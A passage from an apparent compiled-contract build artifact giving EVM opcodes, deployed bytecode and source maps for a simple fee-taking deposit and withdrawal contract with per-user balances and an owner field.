0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E74206465706F736974000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x2710 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0xFF AND CALLVALUE MUL DUP2 PUSH2 0x248 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 CALLVALUE SUB PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x301 DUP3 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x70C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST LT ISZERO PUSH2 0x375 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E742066756E64730000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x3C7 DUP2 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x70C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x46A JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x46F JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x4E6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E642066756E6473000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x5BC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E742066756E64730000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x661 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x666 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x6DD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E642066756E6473000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0x784 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP4 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA6 0xBE EXTCODESIZE CALLDATASIZE SWAP10 0xDF 0xB0 PUSH7 0x3382C8589EC42 0x5E 0xD SWAP4 0xB2 0x5D 0x2D 0xCC NUMBER 0x4A 0xD PUSH11 0xCD42EB28538564736F6C63 NUMBER STOP MOD DIV STOP CALLER ",
							"sourceMap": "713:3690:0:-:0;;;1873:449;5:9:-1;2:2;;;27:1;24;17:12;2:2;1873:449:0;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;1873:449:0;;;;;;;;;;;;;;;;2005:7;1996:6;;:16;;;;;;;;;;;;;;;;;;2230:8;:13;2244:5;;;;;;;;;;;2251:10;2230:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;2230:32:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;2230:32:0;;;;1873:449;713:3690;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106100595760003560e01c80632e1a7d4d1461006d5780635e5c06e2146100a8578063853828b61461010d5780638da5cb5b146101245780639003adfe1461017b578063d0e30db0146101a657610068565b36610068576100666101b0565b005b600080fd5b34801561007957600080fd5b506100a66004803603602081101561009057600080fd5b81019080803590602001909291905050506102ad565b005b3480156100b457600080fd5b506100f7600480360360208110156100cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104ea565b6040518082815260200191505060405180910390f35b34801561011957600080fd5b50610122610502565b005b34801561013057600080fd5b506101396106e1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018757600080fd5b50610190610706565b6040518082815260200191505060405180910390f35b6101ae6101b0565b005b6064341015610227576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f496e73756666696369656e74206465706f73697400000000000000000000000081525060200191505060405180910390fd5b6000612710600260009054906101000a900460ff1660ff1634028161024857fe5b049050803403600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508060016000828254019250508190555050565b600061030182600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461070c90919063ffffffff16565b1015610375576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f496e73756666696369656e742066756e6473000000000000000000000000000081525060200191505060405180910390fd5b6103c781600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461070c90919063ffffffff16565b600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d806000811461046a576040519150601f19603f3d011682016040523d82523d6000602084013e61046f565b606091505b50509050806104e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e642066756e647300000000000000000000000081525060200191505060405180910390fd5b5050565b60036020528060005260406000206000915090505481565b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081116105bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f496e73756666696369656e742066756e6473000000000000000000000000000081525060200191505060405180910390fd5b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d8060008114610661576040519150601f19603f3d011682016040523d82523d6000602084013e610666565b606091505b50509050806106dd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e642066756e647300000000000000000000000081525060200191505060405180910390fd5b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600082821115610784576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b81830390509291505056fea2646970667358221220a6be3b3699dfb06603382c8589ec425e0d93b25d2dcc434a0d6acd42eb28538564736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x59 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x5E5C06E2 EQ PUSH2 0xA8 JUMPI DUP1 PUSH4 0x853828B6 EQ PUSH2 0x10D JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x124 JUMPI DUP1 PUSH4 0x9003ADFE EQ PUSH2 0x17B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x1A6 JUMPI PUSH2 0x68 JUMP JUMPDEST CALLDATASIZE PUSH2 0x68 JUMPI PUSH2 0x66 PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA6 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x2AD JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF7 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x4EA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x122 PUSH2 0x502 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x130 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x139 PUSH2 0x6E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x187 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x190 PUSH2 0x706 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1AE PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x64 CALLVALUE LT ISZERO PUSH2 0x227 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E74206465706F736974000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x2710 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0xFF AND CALLVALUE MUL DUP2 PUSH2 0x248 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 CALLVALUE SUB PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x301 DUP3 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x70C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST LT ISZERO PUSH2 0x375 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E742066756E64730000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x3C7 DUP2 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x70C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x46A JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x46F JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x4E6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E642066756E6473000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x5BC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E742066756E64730000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x661 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x666 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x6DD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E642066756E6473000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0x784 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP4 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA6 0xBE EXTCODESIZE CALLDATASIZE SWAP10 0xDF 0xB0 PUSH7 0x3382C8589EC42 0x5E 0xD SWAP4 0xB2 0x5D 0x2D 0xCC NUMBER 0x4A 0xD PUSH11 0xCD42EB28538564736F6C63 NUMBER STOP MOD DIV STOP CALLER ",
							"sourceMap": "713:3690:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4382:9;:7;:9::i;:::-;713:3690;;12:1:-1;9;2:12;2933:330:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;2933:330:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;2933:330:0;;;;;;;;;;;;;;;;;:::i;:::-;;1543:44;;5:9:-1;2:2;;;27:1;24;17:12;2:2;1543:44:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;1543:44:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;3374:280;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3374:280:0;;;:::i;:::-;;741:20;;5:9:-1;2:2;;;27:1;24;17:12;2:2;741:20:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;868:25;;5:9:-1;2:2;;;27:1;24;17:12;2:2;868:25:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;2489:309;;;:::i;:::-;;;2555:3;2542:9;:16;;2533:50;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2594:8;2626:5;2617:6;;;;;;;;;;;2605:18;;:9;:18;:26;;;;;;2594:37;;2700:3;2688:9;:15;2664:8;:20;2673:10;2664:20;;;;;;;;;;;;;;;;:39;;;;;;;;;;;2787:3;2770:13;;:20;;;;;;;;;;;2489:309;:::o;2933:330::-;3029:1;2992:33;3017:7;2992:8;:20;3001:10;2992:20;;;;;;;;;;;;;;;;:24;;:33;;;;:::i;:::-;:38;;2983:70;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3112:33;3137:7;3112:8;:20;3121:10;3112:20;;;;;;;;;;;;;;;;:24;;:33;;;;:::i;:::-;3089:8;:20;3098:10;3089:20;;;;;;;;;;;;;;;:56;;;;3157:9;3172:10;:15;;3195:7;3172:35;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;3156:51:0;;;3226:4;3218:37;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2933:330;;:::o;1543:44::-;;;;;;;;;;;;;;;;;:::o;3374:280::-;3415:11;3429:8;:20;3438:10;3429:20;;;;;;;;;;;;;;;;3415:34;;3478:1;3469:6;:10;3460:42;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3536:1;3513:8;:20;3522:10;3513:20;;;;;;;;;;;;;;;:2